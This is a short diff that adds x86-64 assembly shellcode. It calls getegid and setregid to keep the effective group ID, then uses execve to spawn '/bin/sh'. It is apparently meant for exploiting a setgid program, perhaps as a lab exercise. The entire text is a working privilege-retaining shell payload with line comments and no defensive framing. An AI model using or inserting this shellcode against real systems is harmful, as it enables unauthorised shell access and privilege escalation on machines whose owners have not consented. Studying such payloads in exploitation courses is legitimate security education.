@@ -1,0 +1,21 @@
+ // setregid(getegid(), getegid());
+ // run ret = getegid()
+    mov $SYS_getegid, %rax
+    syscall
+
+ // run setregid(ret, ret);
+    mov  %rax, %rdi
+    mov  %rax, %rsi
+    mov  $SYS_setregid, %rax
+    syscall
+   
+    mov $0x68732f6e69622f2f, %rbx // rbx: //bin/sh
+    push $0                       // mark the end as 00 00 00 00 00 00 00 00
+    push %rbx  // push //bin/sh
+
+    mov %rsp, %rdi
+    mov $0,%rsi
+    mov $SYS_execve,%rax
+
+    syscall
+
